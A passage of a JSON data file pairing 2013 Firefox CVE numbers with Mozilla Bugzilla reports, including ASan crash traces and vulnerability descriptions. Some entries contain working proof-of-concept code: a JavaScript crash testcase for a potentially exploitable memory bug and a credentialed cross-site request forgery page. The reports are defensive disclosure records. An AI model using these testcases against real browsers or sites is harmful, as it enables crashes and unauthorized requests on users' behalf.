MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:219 #29 0x7fa145345f3e in MessageLoop::RunHandler() ipc/chromium/src/base/message_loop.cc:212 #30 0x7fa145345e29 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:186 #31 0x7fa140bf1f8e in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:163 #32 0x7fa13f8be780 in nsAppStartup::Run() toolkit/components/startup/nsAppStartup.cpp:269 #33 0x7fa13531a0cb in XREMain::XRE_mainRun() toolkit/xre/nsAppRunner.cpp:3872 #34 0x7fa13531f790 in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:3939 #35 0x7fa135322455 in XRE_main toolkit/xre/nsAppRunner.cpp:4140 #36 0x42a3f7 in do_main(int, char**, nsIFile*) browser/app/nsBrowserApp.cpp:272 #37 0x427401 in main browser/app/nsBrowserApp.cpp:632 #38 0x7fa15748776c in #39 0x426b74 in 0x60420d3f73ac is located 44 bytes inside of 120-byte region [0x60420d3f7380,0x60420d3f73f8) freed by thread T0 here: #0 0x41a9e2 in __interceptor_free #1 0x7fa1554056de in moz_free memory/mozalloc/mozalloc.cpp:48 #2 0x7fa139b8b419 in operator delete(void*) ../../../dist/include/mozilla/mozalloc.h:225 #3 0x7fa139b8b419 in nsTextNode::~nsTextNode() content/base/src/nsTextNode.cpp:94 #4 0x7fa139a514d5 in nsNodeUtils::LastRelease(nsINode*) content/base/src/nsNodeUtils.cpp:259 #5 0x7fa13993fb6a in nsGenericDOMDataNode::Release() content/base/src/nsGenericDOMDataNode.cpp:116 #6 0x7fa139b8c0b5 in nsTextNode::Release() content/base/src/nsTextNode.cpp:97 #7 0x7fa13ebd6480 in _ZL17DoDeferredReleaseIP11nsISupportsEvR8nsTArrayIT_E js/xpconnect/src/XPCJSRuntime.cpp:616 #8 0x7fa13ebd5951 in XPCJSRuntime::GCCallback(JSRuntime*, JSGCStatus) js/xpconnect/src/XPCJSRuntime.cpp:816 #9 0x7fa14ca1161c in Collect(JSRuntime*, bool, long, js::JSGCInvocationKind, JS::gcreason::Reason) js/src/jsgc.cpp:4579 #10 0x7fa14ca01f14 in js::GC(JSRuntime*, js::JSGCInvocationKind, JS::gcreason::Reason) js/src/jsgc.cpp:4596 #11 0x7fa14c9761a9 in JS::GCForReason(JSRuntime*, JS::gcreason::Reason) js/src/jsfriendapi.cpp:181 #12 0x7fa13eae7aae in nsXPCComponents_Utils::ForceGC() js/xpconnect/src/XPCComponents.cpp:4058 #13 0x7fa14514eb5b in NS_InvokeByIndex xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #14 0x7fa13ed23d2f in CallMethodHelper::Invoke() js/xpconnect/src/XPCWrappedNative.cpp:2938 #15 0x7fa13ed23d2f in CallMethodHelper::Call() js/xpconnect/src/XPCWrappedNative.cpp:2273 #16 0x7fa13ed23d2f in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) js/xpconnect/src/XPCWrappedNative.cpp:2239 #17 0x7fa13ed7d1b1 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1485 #18 0x7fa14cc5c2df in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) js/src/jscntxtinlines.h:346 #19 0x7fa14cc5c2df in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jsinterp.cpp:408 #20 0x7fa14cc3641f in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode, bool) js/src/jsinterp.cpp:2265 #21 0x7fa14cbe6843 in js::RunScript(JSContext*, js::StackFrame*) js/src/jsinterp.cpp:365 #22 0x7fa14cc5c922 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jsinterp.cpp:421 #23 0x7fa14cc607ab in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) js/src/jsinterp.cpp:454 #24 0x7fa14cf944cd in js::DirectProxyHandler::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/jsproxy.cpp:479 #25 0x7fa14d5f4692 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/jswrapper.cpp:445 #26 0x7fa14cffd93e in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/jsproxy.cpp:2611 #27 0x7fa14d01ae3a in proxy_Call(JSContext*, unsigned int, JS::Value*) js/src/jsproxy.cpp:3175 #28 0x7fa14cc5bbd2 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) js/src/jscntxtinlines.h:346 #29 0x7fa14cc5bbd2 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jsinterp.cpp:401 #30 0x7fa14cc3641f in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode, bool) js/src/jsinterp.cpp:2265 #31 0x7fa14cbe6843 in js::RunScript(JSContext*, js::StackFrame*) js/src/jsinterp.cpp:365 #32 0x7fa14cc66319 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::AbstractFramePtr, JS::Value*) js/src/jsinterp.cpp:550 #33 0x7fa14cc67f31 in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) js/src/jsinterp.cpp:589 #34 0x7fa14c590614 in JS::Evaluate(JSContext*, JS::Handle<JSObject*>, JS::CompileOptions, unsigned short const*, unsigned long, JS::Value*) js/src/jsapi.cpp:5645 previously allocated by thread T0 here: #0 0x41aac2 in malloc #1 0x7fa155405825 in moz_xmalloc memory/mozalloc/mozalloc.cpp:54 #2 0x7fa13d54a640 in operator new(unsigned long) ../../dist/include/mozilla/mozalloc.h:201 #3 0x7fa13d54a640 in nsHtml5TreeOperation::AppendText(unsigned short const*, unsigned int, nsIContent*, nsHtml5TreeOpExecutor*) parser/html/nsHtml5TreeOperation.cpp:167 #4 0x7fa13d554b88 in nsHtml5TreeOperation::Perform(nsHtml5TreeOpExecutor*, nsIContent**) parser/html/nsHtml5TreeOperation.cpp:459 #5 0x7fa13d5710f5 in nsHtml5TreeOpExecutor::RunFlushLoop() parser/html/nsHtml5TreeOpExecutor.cpp:557 #6 0x7fa13d5ab702 in nsHtml5ExecutorFlusher::Run() parser/html/nsHtml5StreamParser.cpp:125 #7 0x7fa14502bdc7 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:627 #8 0x7fa144cc9132 in NS_ProcessNextEvent(nsIThread*, bool) objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:238 #9 0x7fa14139c859 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:82 #10 0x7fa1453460eb in MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:219 #11 0x7fa145345f3e in MessageLoop::RunHandler() ipc/chromium/src/base/message_loop.cc:212 #12 0x7fa145345e29 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:186 #13 0x7fa140bf1f8e in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:163 #14 0x7fa13f8be780 in nsAppStartup::Run() toolkit/components/startup/nsAppStartup.cpp:269 #15 0x7fa13531a0cb in XREMain::XRE_mainRun() toolkit/xre/nsAppRunner.cpp:3872 #16 0x7fa13531f790 in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:3939 #17 0x7fa135322455 in XRE_main toolkit/xre/nsAppRunner.cpp:4140 #18 0x42a3f7 in do_main(int, char**, nsIFile*) browser/app/nsBrowserApp.cpp:272 #19 0x427401 in main browser/app/nsBrowserApp.cpp:632 #20 0x7fa15748776c in Shadow bytes around the buggy address: 0x0c08c1a76e20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c08c1a76e30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c08c1a76e40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c08c1a76e50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c08c1a76e60: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c08c1a76e70: fd fd fd fd fd[fd]fd fd fd fd fd fd fd fd fd fa 0x0c08c1a76e80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c08c1a76e90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c08c1a76ea0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c08c1a76eb0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c08c1a76ec0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap righ redzone: fb Freed Heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 ASan internal: fe ==14882== ABORTING"
      }
    ],
    "CVE-2013-1687": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=866823",
        "title": "Xray Waivers can be used to bypass COWs",
        "description": "This is the lynchpin of bug 863933. Basically, the prototype remapping code in WrapperFatory::Rewrap uses js::Wrapper::wrappedObject instead of js::UncheckedUnwrap to determine if the underlying object is a standard prototype. This means that if there's another wrapper in the middle (like an Xray waiver), we can be fooled into thinking that the object is not a standard prototype. However, the code in ChromeObjectWrapper.cpp unconditionally lets accesses to standard-prototype properties through, under the assumption that they'll get remapped. To fix this, we should do a couple of things: * Definitely stop using js::Wrapper::wrappedObject here * Move this whole thing from prototype calculation into WrapperFactory::PrepareForWrapping so that we unconditionally get the right object when we cross the boundary. In the long term, we should really just kill this prototype remapping stuff entirely."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=863933",
        "title": "Arbitrary code execution via XBL",
        "description": "It is possible to compile a user-defined function in the XBL scope of a \"marquee\" element -- using |_setEventListener| method. Once the defined event is triggered, the code running in the XBL scope can access all content protected by System Only Wrapper. It can also open arbitrary chrome-privileged pages. Additionally, remote web content can access privileged methods from property descriptor objects on Chrome Object Wrappers fetched off of an XBL scope. They can be subsequently used to perform a cross-site scripting attack on a frame with a privileged page, which allows drive-by download of malware."
      }
    ],
    "CVE-2013-1688": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=873966",
        "title": "Arbitrary code execution from Profiler",
        "description": "It is possible to execute arbitrary code when a user examines the profiler output on a malicious website containing a specially crafted code. The problem lies in the function |escapeHTML|, which tries to escape user-controlled strings (in this case, a URI) by writing them to the innerHTML property of a textarea element and reading it back. This approach misses the fact that the provided string can be used to close the inner text node and manipulate the DOM of the containing textarea element."
      }
    ],
    "CVE-2013-1689": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=817219",
        "title": "Crash @xul!nsDOMEvent::GetTargetFromFrame on poison value",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:20.0) Gecko/20.0 Firefox/20.0 Build ID: 20121126030823 Steps to reproduce: Description: The attached testcase crashes the browser, which seems to be related to event handling with frames. Crashes on a poison value, which indicates a potentially exploitable behaviour. Tested and Affected Versions: Firefox 20.0a1 (trunk) Firefox 17.0 Testcase: crash.html: <html> <script src=\"crash.js\"></script> <script> window.setTimeout(\"start();\", 10); </script> <body> </body> </html> crash.js: function start() { o3=document.createElement('input'); tmp = o3.ownerDocument.createElement('iframe'); document.body.appendChild(tmp); o4=tmp.contentDocument; cb_3=function() { var f = callback_3; callback_3 = null; return f(arguments); } o3.addEventListener('change', cb_3, false); o51=document.createElement('img'); o94=document.createElement('input'); o94.type='checkbox'; o3.appendChild(o94); o192=document.createElement('input'); o192.type='button'; o94.appendChild(o192); o263=document.createEvent('MouseEvents'); o263.initMouseEvent('click', true, true, window,0, 0, 0, 0, 0, false, false, false, false, 0, null); o192.dispatchEvent(o263) } function callback_3() { o192.addEventListener('DOMNodeRemoved', callback_21, true); o51.appendChild(o192); } function callback_21() { o4.documentElement.appendChild(o192); location.reload(); } When trying to include the Javascript code into the HTML it doesn't seem to be crashing on Windows. Both files are attached. Crash log on Linux: Program received signal SIGSEGV, Segmentation fault. 0xf68ba5a4 in nsWeakFrame::InitInternal(nsIFrame*) () from /home/fred/debugging/firefox/libxul.so (gdb) info reg eax 0x0 0 ecx 0xffffff80 -128 edx 0xf35017ff -212854785 ebx 0xf767adf8 -144200200 esp 0xfff7f150 0xfff7f150 ebp 0xfff7f168 0xfff7f168 esi 0xe17de3fc -511843332 edi 0xe775be68 -411713944 eip 0xf68ba5a4 0xf68ba5a4 <nsWeakFrame::InitInternal(nsIFrame*)+52> eflags 0x210282 [ SF IF RF ID ] cs 0x23 35 ss 0x2b 43 ds 0x2b 43 es 0x2b 43 fs 0x0 0 gs 0x63 99 (gdb) x/3i $eip => 0xf68ba5a4 <_ZN11nsWeakFrame12InitInternalEP8nsIFrame+52>: mov 0x1c(%edx),%eax 0xf68ba5a7 <_ZN11nsWeakFrame12InitInternalEP8nsIFrame+55>: mov (%eax),%edi 0xf68ba5a9 <_ZN11nsWeakFrame12InitInternalEP8nsIFrame+57>: mov 0xc(%edi),%eax (gdb) bt 20 #0 0xf68ba5a4 in nsWeakFrame::InitInternal(nsIFrame*) () from /home/fred/debugging/firefox/libxul.so #1 0xf6a07017 in nsEventStateManager::GetEventTarget() () from /home/fred/debugging/firefox/libxul.so #2 0xf6a0d830 in nsDOMEvent::GetTargetFromFrame() () from /home/fred/debugging/firefox/libxul.so #3 0xf6a0d8da in nsDOMEvent::InitPresContextData(nsPresContext*) () from /home/fred/debugging/firefox/libxul.so #4 0xf6a1595c in nsDOMBeforeUnloadEvent::nsDOMBeforeUnloadEvent(nsPresContext*, nsEvent*) () from /home/fred/debugging/firefox/libxul.so #5 0xf6a159e2 in NS_NewDOMBeforeUnloadEvent(nsIDOMEvent**, nsPresContext*, nsEvent*) () from /home/fred/debugging/firefox/libxul.so #6 0xf69a1c5e in nsDocument::CreateEvent(nsAString_internal const&, nsIDOMEvent**) () from /home/fred/debugging/firefox/libxul.so #7 0xf686f0b2 in nsDocumentViewer::PermitUnload(bool, bool*) () from /home/fred/debugging/firefox/libxul.so #8 0xf6d337da in nsDocShell::InternalLoad(nsIURI*, nsIURI*, nsISupports*, unsigned int, unsigned short const*, char const*, nsIInputStream*, nsIInputStream*, unsigned int, nsISHEntry*, bool, nsIDocShell**, nsIRequest**) () from /home/fred/debugging/firefox/libxul.so #9 0xf5f8377f in nsDocShell::LoadHistoryEntry(nsISHEntry*, unsigned int) () from /home/fred/debugging/firefox/libxul.so #10 0xf6d27b2b in nsDocShell::Reload(unsigned int) () from /home/fred/debugging/firefox/libxul.so #11 0xf5d90fea in nsLocation::Reload(bool) () from /home/fred/debugging/firefox/libxul.so #12 0xf6eda590 in NS_InvokeByIndex_P () from /home/fred/debugging/firefox/libxul.so #13 0xf6cecc6a in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) () from /home/fred/debugging/firefox/libxul.so #14 0xf6cf37ac in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) () from /home/fred/debugging/firefox/libxul.so #15 0xf709f156 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) () from /home/fred/debugging/firefox/libxul.so #16 0xf709321a in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) () from /home/fred/debugging/firefox/libxul.so #17 0xf7153545 in js::mjit::EnterMethodJIT(JSContext*, js::StackFrame*, void*, JS::Value*, bool) () from /home/fred/debugging/firefox/libxul.so #18 0xf7153649 in js::mjit::JaegerShot(JSContext*, bool) () from /home/fred/debugging/firefox/libxul.so #19 0xf709ea30 in js::RunScript(JSContext*, JS::Handle<JSScript*>, js::StackFrame*) () from /home/fred/debugging/firefox/libxul.so Crash log on Windows: xul!nsDOMEvent::GetTargetFromFrame+0x137d3e xul!nsDOMEvent::nsDOMEvent+0xbc xul!NS_NewDOMBeforeUnloadEvent+0x1d xul!nsEventDispatcher::CreateEvent+0x36f xul!nsHTMLDocument::CreateEvent+0x38 xul!DocumentViewerImpl::PermitUnload+0xbb xul!nsDocShell::InternalLoad+0x5f8 xul!nsDocShell::LoadHistoryEntry+0x256 xul!nsDocShell::Reload+0xd6 xul!nsLocation::Reload+0x39 xul!NS_InvokeByIndex_P+0x27 xul!XPCWrappedNative::CallMethod+0x319 xul!XPC_WN_CallMethod+0xaa mozjs!js::InvokeKernel+0x59 mozjs!js::Interpret+0x6ce4 mozjs!js::RunScript+0x415 mozjs!js::InvokeKernel+0x250 mozjs!js::Invoke+0x128 mozjs!JS_CallFunctionValue+0x41 xul!nsXPCWrappedJSClass::CallMethod+0x488 xul!nsDOMEvent::GetTargetFromFrame+0x137d3e: 6ff5b80e 8b511c mov edx,dword ptr [ecx+1Ch] ds:002b:f0de801b=???????? reported by nils of vulndev ltd."
      }
    ],
    "CVE-2013-1690": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=857883",
        "title": "Crash with onreadystatechange and reload",
        "description": "Crashes with the following stack trace when trying to execute unmapped memory. Testcase is attached, requires an empty test.html in the same directory. The testcase is very timing dependent, it works almost every time from a file://. I had it reproducing remotely a couple of times after quite a few reloads. Stack on windows: 0x7099e938 xul!nsRefPtr<nsXULPrototypeDocument>::nsRefPtr<nsXULPrototypeDocument>(class nsRefPtr<nsXULPrototypeDocument> * aSmartPtr = 0x70472e30)+0xe xul!nsDocumentViewer::Stop(void)+0x61 xul!nsDocShell::Stop(unsigned int aStopFlags = 3)+0x3f xul!nsDocShell::InternalLoad(class nsIURI * aURI = 0x081f2500, class nsIURI * aReferrer = 0x00000000, class nsISupports * aOwner = 0x06267080, unsigned int aFlags = 0, wchar_t * aWindowTarget = 0x00000000 \"\", char * aTypeHint = 0x706cb730 \"\", class nsAString_internal * aFileName = 0x706d73b4, class nsIInputStream * aPostData = 0x00000000, class nsIInputStream * aHeadersData = 0x00000000, unsigned int aLoadType = 2, class nsISHEntry * aSHEntry = 0x0803e150, bool aFirstParty = true, class nsIDocShell ** aDocShell = 0x00000000, class nsIRequest ** aRequest = 0x00000000)+0x76b xul!nsDocShell::LoadHistoryEntry(class nsISHEntry * aEntry = 0x0803e150, unsigned int aLoadType = 2)+0x290 xul!nsDocShell::Reload(unsigned int aReloadFlags = 0)+0xf6 xul!nsLocation::Reload(bool aForceget = false)+0x39 xul!NS_InvokeByIndex(class nsISupports * that = 0x0adb2940, unsigned int methodIndex = 0x14, unsigned int paramCount = 1, struct nsXPTCVariant * params = 0x0013d4c8)+0x27 xul!XPC_WN_CallMethod(struct JSContext * cx = 0x07ef8e00, unsigned int argc = 0, class JS::Value * vp = 0x04d900c8)+0x739 xul!xpc::WrapperFactory::Rewrap(struct JSContext * cx = <Memory access error>, class JSObject * existing = <Memory access error>, class JSObject * obj = <Memory access error>, class JSObject * wrappedProto = <Memory access error>, class JSObject * parent = <Memory access error>, unsigned int flags = <Memory access error>)+0x2f3 mozjs!JSCompartment::wrap(struct JSContext * cx = 0x00000000, class JS::MutableHandle<JS::Value> vp = class JS::MutableHandle<JS::Value>, class JS::Handle<JSObject *> existingArg = class JS::Handle<JSObject *>)+0x2cc 0x56eb5a0 0xffffff86"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=901365",
        "title": "Firefox 0-day found on Tor .onion service (reported on Reddit)",
        "description": "Reddit is reporting a Firefox 0-day that has been injected on some .onion sites (Tor hidden services). http://www.reddit.com/r/onions/comments/1jmrta/founder_of_the_freedom_hosting_arrested_held/ The most complete link I've seen appears to be http://pastebin.mozilla.org/2777139 (and copied to http://pastebin.mozilla.org/2781408 in case the first link is ephemeral) I've also seen http://pastebin.com/pmGEj9bV http://pastebin.com/K61QZpzb http://pastebin.mozilla.org/2776374 and I'm not sure where they're all from or how they're related (look duplicative). No point in hiding the bug at this point, this is all over the twitters and will just collect dupes."
      }
    ],
    "CVE-2013-1692": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=866915",
        "title": "Do not send data XHR HEAD request",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31 Steps to reproduce: During a penetration test for a client, I found that CSRF was possible on a piece of their functionality when sent as a HEAD. In the latest version of chrome, they send a preflight request for this HEAD request, but Firefox 20 is not. I will attach the Request and Response with the sensitive client information omitted. My CSRF Proof of Concept has xmlhttp.withCredentials = true;. I've supplied two things to you, the code that allowed for my exploit to work, as well as the request response pair that happens when the request is sent. I've omitted sensitive information about the application this worked on because I do not own it, but if needed I'll try to spin up an environment that is similar to what I'm working on to recreate it. Since I can only upload one file, I'm going to paste my Proof of Concept code here, and attach an image of the actual exploit taking place after the form request was made. <!-- Johnathan Kuskos This file is psuedocode for a successful CSRF I was able to exploit for a client. The file was hosted on my personal site at malfiles.jkuskos.com and targetted a URL that i've renamed \"example.com\" for sake of my client's privacy. I will attempt to supply as much information as I can, as I believe that a PreFlight request should not have allowed this to take place in Firefox 20.0. --> <!DOCTYPE html> <html> <head> <script> function loadXMLDocHEAD() { var xmlhttp; if (window.XMLHttpRequest) {// code for IE7+, Firefox, Chrome, Opera, Safari xmlhttp=new XMLHttpRequest(); } else {// code for IE6, IE5 xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\"); } xmlhttp.onreadystatechange=function() { if (xmlhttp.readyState==4 && xmlhttp.status==200 || xmlhttp.status==302) { document.getElementById(\"myDiv\").innerHTML=xmlhttp.responseText; } } var url = \"https://example.com\";//true victim omitted var params = \"body=\";//true parameters omitted xmlhttp.withCredentials = true; xmlhttp.open(\"HEAD\", url,true); xmlhttp.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\"); xmlhttp.send(params); } </script> </head> <body> <h1>HEAD request</h1> <button type=\"button\" onclick=\"loadXMLDocHEAD()\">Send HEAD</button> <div id=\"myDiv\"></div> </body> </html> Actual results: The CORS request was successfully sent. Expected results: A Preflight request should have first sent an options request to check for if the HTTP verb was allowed, as specified here: https://developer.mozilla.org/en-US/docs/HTTP/Access_control_CORS#Preflighted_requests"
      }
    ],
    "CVE-2013-1693": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=711043",
        "title": "SVG Filter Timing Attack",
        "description": "The SVG filter code has various optimisations which mean that different inputs images will take varying amounts of time for the same filter. It's possible to time this difference to read pixel values. The feMorphology filter in particular has an optimisation that means that it will process an image of uniform colour (e.g. all black) much quicker than one containing varying pixel values. The PoC I've attached is very simple and just tries to tell if some links are :visited. Of course it could be extended to read pixel values from iframes to try and read text cross-domain. On my PC (WinXP, Intel Core 2 Duo E8400) with the default settings of the PoC, the difference between a positive and negative result is about 70ms. If it doesn't work for you, try altering the filterRes or radius variables in steps of 10."
      }
    ],
    "CVE-2013-1694": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=848535",
        "title": "Use of PreserveWrapper in cases when we don't have a wrapper seems broken",
        "description": "Consider the following scenario: 1) XHR starts. 2) Its wrapper, if any, is collected. 3) A C++ readystatechange listener calls GetResponse, and the response type is JSON or arraybuffer. This causes nsXMLHttpRequest::RootJSResultObjects to be called, which calls PreserveWrapper. 4) JS touches the XHR object, causing it to be wrapped, which calls nsWrapperCache::SetWrapper(). In a debug build this will assert fatally. In an opt build this will clear the preserved-wrapper flag on the wrapper cache, which seems bad. Should we just preserve that flag on SetWrapper and remove the assert in that method, perhaps? Alternately, we should stop using PreserveWrapper to mean \"hold JS objects\" in XHR. Note that the above scenario is pretty simple to produce with a worker XHR if extension JS can ever touch the main-thread nsXMLHttpRequest of it, as far as I can tell."
      }
    ],
    "CVE-2013-1695": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=849791",
        "title": "Frame DocShells do not inherit sandbox flags from their parents.",
        "description": "At the moment the sandbox flags aren't copied to a new frame's DocShell. So, if someone has a site that other people are hosting in a sandboxed iframe, they can just add a frame to their site and they're suddenly not sandboxed at all. I believe the problem is in content/base/src/nsFrameLoader.cpp // Is this an <iframe> with a sandbox attribute or a parent which is // sandboxed ? HTMLIFrameElement* iframe = HTMLIFrameElement::FromContent(mOwnerContent); uint32_t sandboxFlags = 0; if (iframe) { sandboxFlags = iframe->GetSandboxFlags(); uint32_t parentSandboxFlags = iframe->OwnerDoc()->GetSandboxFlags(); if (sandboxFlags || parentSandboxFlags) { // The child can only add restrictions, not remove them. sandboxFlags |= parentSandboxFlags; mDocShell->SetSandboxFlags(sandboxFlags); } } It only checks to see if the parent is sandboxed, if it is an iframe element. I haven't got time to add a test case at the moment, I'll try and add one later."
      }
    ],
    "CVE-2013-1696": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=761667",
        "title": "Firefox ignores the X-Frame-Options header when using server push",
        "description": "Bugzilla uses the \"X-Frame-Options: SAMEORIGIN\" header to prevent clickjacking, but for some reason, Firefox ignores this header for buglists. A testcase is attached to bug 761046. This seems related to the fact that buglists use the server push technology, see e.g. http://search.cpan.org/~markstos/CGI.pm-3.59/lib/CGI.pm#Server_Push. Opera, Chrome, Safari and IE8+ correctly prevent buglists from being loaded in frames, but Firefox doesn't. Tested with Fx 13, and dveditz reproduced with a nightly build, from what he told me on IRC."
      }
    ],
    "CVE-2013-1697": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=858101",
        "title": "[[DefaultValue]] on XrayWrapper can call content-defined toString/valueOf methods",
        "description": "This is a regression between Firefox 6.0.2 and Firefox 7. See also bug 720619."
      }
    ],
    "CVE-2013-1698": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=876044",
        "title": "Domain displayed in cam/mic permission dialog matches URL location bar, not content",
        "description": "When getUserMedia is called from a cross-domain iframe, the domain displayed in the permission dialog matches the topmost page (displayed in address bar) and not the domain from which the iframe was sourced. Click on link in first iframe - same domain - permission dialog will display correct domain. Click on link in second iframe - cross-domain, from people.mozilla.org - permission dialog will display incorrect domain (above)."
      }
    ],
    "CVE-2013-1699": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=840882",
        "title": "Homograph attack prevention is incomplete",
        "description": "http://www.shmoo.com/idn/ Observe that our presentation of both 'evil' and 'good' URIs is identical. Then compare to Safari (which shows \"www.xn--theshmogroup-bgk.com\" instead of \"www.theshmoogroup.com\"). This is probably filed under the wrong component, but worth filing than not at all!"
      }
    ],
    "CVE-2013-1700": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=867056",
        "title": "Arbitrary code execution using a temporarily inaccessible file",
        "description": "In fixing Bug 850492, the updater.exe that the Maintenance Service tries to verify is now copied to a known safe location to stop the user pointing it to a malicious path and replacing the executable after verification. Unfortunately, if the system cannot copy the file it doesn't error and exit, just logs a warning, uses the malicious path and continues on like normal. This introduces a second race condition in that if you have an updater.exe which doesn't exist when execution hits workmonitor.cpp:589 the file copy will fail and the system will use the malicious path. The attacker can then create malicious_path\\updater.exe before the program sets the write lock at workmonitor.cpp:332 and then use the same process described in Bug 850492 to execute arbitrary code as SYSTEM. For convenience, source revision the line numbers are for is latest at the current time and located at: https://hg.mozilla.org/mozilla-central/file/1eb382609c2d/toolkit/components/maintenanceservice/workmonitor.cpp"
      }
    ],
    "CVE-2013-1704": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=883313",
        "title": "ASAN heap-use-after-free in nsINode::GetParentNode",
        "description": "The attached testcase crashes the ASAN build of Firefox nightly. Asan output: ==58460== ERROR: AddressSanitizer: heap-use-after-free on address 0x7f9328660368 at pc 0x7f934b907d3b bp 0x7fff6226ffe0 sp 0x7fff6226ffd8 READ of size 8 at 0x7f9328660368 thread T0 #0 0x7f934b907d3a in nsINode::GetParentNode() const /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/../../dist/include/nsINode.h:760:0 #1 0x7f934c802df6 in nsINode::ReplaceOrInsertBefore(bool, nsINode*, nsINode*, mozilla::ErrorResult&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/base/src/nsINode.cpp:1663:0 #2 0x7f934cbd1707 in nsHTMLDocument::SetBody(nsGenericHTMLElement*, mozilla::ErrorResult&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/content/html/document/src/nsHTMLDocument.cpp:1132:0 #3 0x7f934e4ff309 in mozilla::dom::HTMLDocumentBinding::set_body(JSContext*, JS::Handle<JSObject*>, nsHTMLDocument*, JSJitSetterCallArgs) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/obj-firefox/dom/bindings/HTMLDocumentBinding.cpp:201:0 #4 0x7f934e4fbeb5 in mozilla::dom::HTMLDocumentBinding::genericSetter(JSContext*, unsigned int, JS::Value*) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/obj-firefox/dom/bindings/HTMLDocumentBinding.cpp:1468:0 #5 0x7f934fdf5c48 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/jscntxtinlines.h:349:0 #6 0x7f934fdf5395 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /builds/slave/m-cen-l64-dbg-asan-ntly-000000/build/js/src/vm/Interpreter.cpp:381:0 #7 0x7f934fdf61f6 in js::Invoke(JSContext*, JS::Value 